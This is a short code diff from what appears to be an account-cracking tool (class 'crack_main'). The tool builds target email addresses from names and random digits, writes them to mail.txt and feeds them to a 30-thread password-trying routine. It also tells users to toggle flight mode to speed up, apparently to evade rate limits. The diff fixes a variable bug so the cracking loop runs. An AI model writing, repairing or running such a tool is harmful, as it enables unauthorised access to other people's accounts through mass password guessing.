@@ -441,7 +441,7 @@ class crack_main():
                         else:
                                 mail = ''.join(random.choice(string.digits) for _ in range(4))
                                 open('mail.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
-                        fo = open('mail.txt', 'r').read().splitlines()
+                        self.id = open('mail.txt').read().splitlines()
                         self.pasw()
         def cracknum(self,id):
                 global methods
@@ -508,7 +508,7 @@ class crack_main():
         def pasw(self):
                 passlist = []
                 with ThreadPool(max_workers=30) as formSubmit:
-                        total = str(len(fo))
+                        total = str(len(self.id))
                         clear()
                         print(' Total account : \033[1;32m'+total)
                         print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
